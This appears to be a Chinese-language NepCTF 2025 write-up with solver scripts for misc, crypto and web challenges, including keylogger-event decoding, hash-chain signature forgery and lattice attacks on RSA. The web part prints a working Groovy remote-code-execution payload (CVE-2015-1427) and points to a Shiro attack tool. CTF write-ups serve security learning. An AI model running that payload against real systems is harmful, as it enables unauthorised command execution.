## Misc

### MoewBle喵泡

关于毅力这一块（），真给他打通关了

![](https://seandictionary.top/wp-content/uploads/2025/07/image-2-1024x239.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-3.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-4.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-5.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-6-1024x306.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-7-1024x336.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-8.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-9.png)

![](https://seandictionary.top/wp-content/uploads/2025/07/image-10-1024x576.png)

NepCTF{94721248-773d-0b25-0e2d-db9cac299389}

## Speedmino

关于毅力这一块（）2600分还是太简单了

![](https://seandictionary.top/wp-content/uploads/2025/07/ZTF_UJ7YNRGZ0_XJQ@I-1-1024x683.png)

不过这个flag竟然是位于下方可恶啊，然后多打了几分钟才拿到，忘了截图了（）

### NepBotEvent

直接用脚本恢复就行了

```
import struct

# 键码映射
KEYMAP = {
    2: ('1', '!'), 3: ('2', '@'), 4: ('3', '#'), 5: ('4', '$'), 6: ('5', '%'),
    7: ('6', '^'), 8: ('7', '&'), 9: ('8', '*'), 10: ('9', '('), 11: ('0', ')'),
    12: ('-', '_'), 13: ('=', '+'), 14: ('\b', '\b'), 15: ('\t', '\t'),
    16: ('q', 'Q'), 17: ('w', 'W'), 18: ('e', 'E'), 19: ('r', 'R'),
    20: ('t', 'T'), 21: ('y', 'Y'), 22: ('u', 'U'), 23: ('i', 'I'),
    24: ('o', 'O'), 25: ('p', 'P'), 26: ('[', '{'), 27: (']', '}'),
    28: ('[ENTER]', '[ENTER]'),
    30: ('a', 'A'), 31: ('s', 'S'), 32: ('d', 'D'), 33: ('f', 'F'),
    34: ('g', 'G'), 35: ('h', 'H'), 36: ('j', 'J'), 37: ('k', 'K'), 38: ('l', 'L'),
    39: (';', ':'), 40: ("'", '"'), 41: ('`', '~'),
    43: ('\\', '|'),
    44: ('z', 'Z'), 45: ('x', 'X'), 46: ('c', 'C'), 47: ('v', 'V'),
    48: ('b', 'B'), 49: ('n', 'N'), 50: ('m', 'M'),
    51: (',', '<'), 52: ('.', '>'), 53: ('/', '?'),
    57: (' ', ' '),
}

SHIFT_KEYS = {42, 54}  # Left and right Shift keycodes


def get_char_from_code(code, shift):
    if code in KEYMAP:
        return KEYMAP[code][1] if shift else KEYMAP[code][0]
    return None


def parse_event_file(filename):
    EVENT_SIZE = 24  # bytes per input_event
    shift_keys_held = set()

    with open(filename, "rb") as f:
        while True:
            data = f.read(EVENT_SIZE)
            if len(data) < EVENT_SIZE:
                break

            # unpack input_event: struct timeval (2x8 bytes), type (2), code (2), value (4)
            tv_sec, tv_usec, type_, code, value = struct.unpack('qqHHI', data)

            if type_ != 1:
                continue  # Only process EV_KEY

            if code in SHIFT_KEYS:
                if value == 1:  # Key down
                    shift_keys_held.add(code)
                elif value == 0:  # Key up
                    shift_keys_held.discard(code)
                continue

            if value != 1:  # Only handle key down
                continue

            shift_on = len(shift_keys_held) > 0
            ch = get_char_from_code(code, shift_on)
            if ch:
                if ch == '[ENTER]':
                    print()  # newline
                else:
                    print(ch, end='', flush=True)


if __name__ == "__main__":
    parse_event_file("NepBot_keylogger")


# whoami
# ifconfig
# uanme uname -a
# ps -aux
# cat /etc/issue
# pwd
# mysql -uroot -proot
# show databases;
# use NepCTF-20250725-114514;
# show tables;
# Enjoy yourself~
# See u again.
# Hacked By 1cePeak:)
```

## Crypto

### Nepsign

观察签名原理，就是利用哈希链，通过对链上的哈希值进行一定次数变换并和公钥判断，以此进行验签。

其中签名是通过对私钥进行step次数的哈希，以此得到签名结果，结果列表中的每一项都仅和对应的私钥和step有关。也就是说该位置上相同的step会产生对应位置上相同的签名，同时step又和消息的哈希值有关，于是就可以尝试利用其他消息（需要满足在某位置上能产生和目标消息同样的step）进行签名，就能得到目标消息在该位置的签名结果。爆破全部的48位即可。

尝试一次碰撞两个字节发现效率很低，只能一次一个字节碰撞，大概要6min左右

```
from pwn import *
from ast import literal_eval
from gmssl import sm3
import os
import time

start = time.time()
last_time = start

# context(log_level='debug')

addr = "".split(":")
io = remote(addr[0], int(addr[1]), ssl=True)

def SM3(data):
    d = [i for i in data]
    h = sm3.sm3_hash(d)
    return h

def sums(hash, i):
    sum = 0
    for j in range(1, 65):
        if hash[j - 1] == hex_symbols[i]:
            sum += j
    return sum % 255

hex_symbols = "0123456789abcdef"
target_hash = SM3(b"happy for NepCTF 2025")
target_bytes = bytes.fromhex(target_hash)
target_steps = list(target_bytes) + [sums(target_hash, i) for i in range(16)]
target_qq = [''] * 48

for i in range(48):
    while True:
        msg = os.urandom(32)
        msg_hash = SM3(msg)
        msg_bytes = bytes.fromhex(msg_hash)
        msg_steps = list(msg_bytes) + [sums(msg_hash, j) for j in range(16)]
        if msg_steps[i] == target_steps[i]:
            break
    io.recvuntil(b">")
    io.sendline(b"1")
    io.recvuntil(b"msg: ")
    io.sendline(msg.hex().encode())
    qq = literal_eval(io.recvline().strip().decode())
    target_qq[i] = qq[i]
    print(f"{i:2d} | {qq[i]} | {time.time() - start:6.2f} {time.time() - last_time:5.2f}")
    last_time = time.time()

io.recvuntil(b">")
io.sendline(b"2")
io.recvuntil(b"qq: ")
io.sendline(str(target_qq).encode())

io.interactive()
```

### ezRSA2

先CRT可以得到一部分的d，先称之为dd，然后根据CRT可以知道实际d一定是dd加上一定倍数的所有模数乘积，即，$d=dd+k_1tmp$。关注密钥生成函数，发现d的位数是固定的675位，对于小私钥，曾有维纳攻击可以计算$d<N^{0.25}$很显然该范围不适用，但是可以借助下维纳攻击的思路。

维纳攻击利用$ed-1=k(N-p-q+1)$造格进行计算，这里可以类似的利用$e(dd+k_1tmp)-1=k_2(N-p-q+1)$然后进行整理得到$e\cdot dd-1+k_1e\cdot tmp+k_2(N+1)=k_2(p+q)$。于是可以尝试造格

$$
(k_1,1,k_2) \left(\begin{matrix} 1&&e\cdot tmp\\ &1&e\cdot dd-1\\ &&N+1\\ \end{matrix}\right) =(k_1,1,k_2(p+q))
$$

粗算一下$k_1\approx 2^{340},k_2\approx 2^{670}$，要额外参数配平，先预设$K_1=2^{1400},K_2=2^{1700}$，得到格

$$
(k_1,1,k_2) \left(\begin{matrix} K_1&&e\cdot tmp\\ &K_2&e\cdot dd-1\\ &&N+1\\ \end{matrix}\right) =(K_1k_1,K_2,k_2(p+q))
$$

按该参数跑了一次发现还是不对，再在参数基础上细调，得到满足下述两个约束条件的情况。得出私钥

```
from Crypto.Util.number import *

e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29
N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11

ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e

hints = [1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]
dd = CRT(hints, list(sieve_base)[1:len(hints)+1])
tmp = prod(list(sieve_base)[1:len(hints)+1])

K1 = 2 ** 1360
K2 = 2 ** 1720
Ge = Matrix(ZZ, 3, 3)
Ge[0, 0] = K1
Ge[1, 1] = K2
Ge[0, 2] = e*tmp
Ge[1, 2] = e*dd-1
Ge[2, 2] = N+1

L = Ge.LLL()

for row in L:
    d = dd + row[0]//K1*tmp
    print(int(d).bit_length(), row[1]==K2)
    # 这里关注d的位数要等于675
    # 然后最短向量的中间一位应该为K2
    # 按照这两个约束进行调参
    if int(d).bit_length() == int(2048*0.33):
        m = pow(ct, d, N)
        print(long_to_bytes(int(m)))
```

### Lattice Bros

先是个利用LLL对精确代数值计算一定次数的极小多项式，一般的话可以如下造格，对于多项式

$$
a_0+a_1x+a_2x^2+\cdots +a_dx^d=0
$$

$$
(a_0,a_1,a_2,\cdots,a_d) \left(\begin{matrix} 1 & 0 & 0 & \cdots & 0 & \lfloor \alpha^0 M \rfloor \\ 0 & 1 & 0 & \cdots & 0 & \lfloor \alpha^1 M \rfloor \\ 0 & 0 & 1 & \cdots & 0 & \lfloor \alpha^2 M \rfloor \\ \vdots & \vdots & \vdots & \ddots & \vdots & \vdots \\ 0 & 0 & 0 & \cdots & 1 & \lfloor \alpha^d M \rfloor \\ \end{matrix}\right) =(a_0,a_1,a_2,\cdots,a_d,0)
$$

其中需要用到一个特定的大数M用来配平，一般和α的精度有关

不过sage里面内置了计算极小多项式的方法，所以只要调用即可计算出a0。然后就是HNP的模板题

```
# NepCTF 2025
# Lattice Bros

from Crypto.Util.number import *

lis = [(541847931463604073209188621415697353813245102261880389530448, 293760933113243563398917466885108625646262447370201484418246), (235213326900086489464935804156966465366154623411555613791270, 660823982268225103178763707015491421784294988488272636270997), (826464884761457937459245903152143755707241416981488127320435, 428521663319038461250005113612781686761766888058391496085911), (589542000504317435156560078533519448295689695687499354390208, 155284353896000150766154807679279597476176668344402166959399), (968823371588600973965757332601758200815345862153455338808286, 870008943690791009196027169525956126827736285614393106689402), (621636099728440147413990266662022925118216803638588918660041, 265635912066749696542909843111997941904342442664219734956888), (426696569424050102229606043215592727790577655338668728275370, 279313121876980354011480010042682666651614765507190502627689), (89450479064580125731654556963306718472532905610952012502649, 465933125964565419295325650759566635253450915499965633327941), (480355476500393865742379469913983270769356894135485925662119, 894041172171871806404285309781862268351135623868845025443422), (842436524669577199024236805258573090764419350786291073287889, 345478552143958037534551648319293899442551000874041707820740), (650054674429185550652935714084022116516082323269321462104664, 441999979283903658157822753439653947343822546158589507765994), (46289431385578693366971976442426853079852982529357847290686, 625618376463384339878849844467050454204685252824782609369180), (71444185449163133531919043374545893927347050624346741281881, 955925578289311966288639224625142299309823207245807788495453), (192579726169321656812883068526498248523814846320328766176253, 626481822474054336470183912297952839011392733501646931370367), (736527635648804640774976580747540045854351230084566721853611, 276626211757586963928788091386096607703513204646314683038338), (177922521867185878959621840269164617147915792720210315529733, 541058782621716573816245900423919799500476442285991532228641), (40610451174818168154306630612571678739921107216052349044576, 727642592899858828601137105077611015328512898368636299587376), (385012983728389322601149562441674995471397288632464238356283, 353921151307105661267278594470212933060655245893209524497156), (750447975601038834764379841158092390933760641866111445401426, 391626416964965737035878375834907580903143512300198923948189), (115058604943298010958881205548782439407592353731185670266593, 491630592857258949793489206081490523001249620510479961058022), (327389234395954477946639629629085910688793716425320663599360, 24975272330009592102362429346350824580378490147041708568130), (115595274689129534885608766476695918464309130165432995990883, 757961876891952019297626599379744405302595090402128271144165), (950804723308776351161744501221236453742418549093165078282534, 20307246759635231945223392614290397512873344480184942904518), (724537610412063699714461780160573528810830178440136810747811, 149681928388378582933943374524511804362928290938917573644613), (340891278018589324130004945217960336392205386747747011263373, 683307718413135477104477081812052183267507312278283317237187), (104379682905784169840335131193505192063050242530811180817410, 715010230598797717533306270232399781090458356371977748416491), (644160326926600986730919713173510327120201404569141824224075, 127877985489410167008195578625004740882394608402141169695352), (549253388716005399852261816416312267100135940382820676807345, 210560134643237517255193955173709174155305784935427470113433), (968265711632086435506163736279856957220961064226797549228006, 273174723915971720522674140326199419265943707917542063022561), (704367622558261900937184683100177434487519780290678439135652, 959106497548134540301589019840013331842784496835379005298630)]

alpha = 54236.606188881754809671280151541781895183337725393

f = algdep(alpha, 3)
a0 = f(0)
print(f)
print(a0)

d = 981020902672546902438782010902608140583199504862558032616415
p = d - a0
print(p)
print(p.is_prime())

if p.is_prime():
    B = 2**30
    ge = [[0] * 32 for _ in range(32)]
    for i in range(30):
        ge[i][i] = p
        ge[-2][i] = lis[i][0]
        ge[-1][i] = lis[i][1]
    ge[-2][-2] = B/p
    ge[-1][-1] = B

    Ge = Matrix(QQ, ge)
    L = Ge.LLL()
    # print(L)
    for row in L:
        if abs(row[-1]) == B:
            # print(row)
            print(long_to_bytes(p-int(row[-2]*p/B)))
```

再一次致敬传奇坠机选手SeasDictionary，他曾在[[GHCTF 2025] baby_lattice](https://seandictionary.top/ghctf-2025/)一模一样的HNP中犯下了一模一样的错误，忘了可以取反了（）

## Web

### Groovy & RevengeGroovy

寻找了下有关Groovy注入，找到了这个CVE-2015-1427，POC里有下述payload，两道题都能用

```
java.lang.Math.class.forName("java.io.BufferedReader").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName("java.io.InputStreamReader").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("env").getInputStream())).getText()
```

### JavaSeri

进去以后提醒是shiro框架，用[工具一把梭](https://github.com/SummerSec/ShiroAttack2 "工具一把梭")

![](https://seandictionary.top/wp-content/uploads/2025/07/Snipaste_2025-07-27_17-48-44.png)
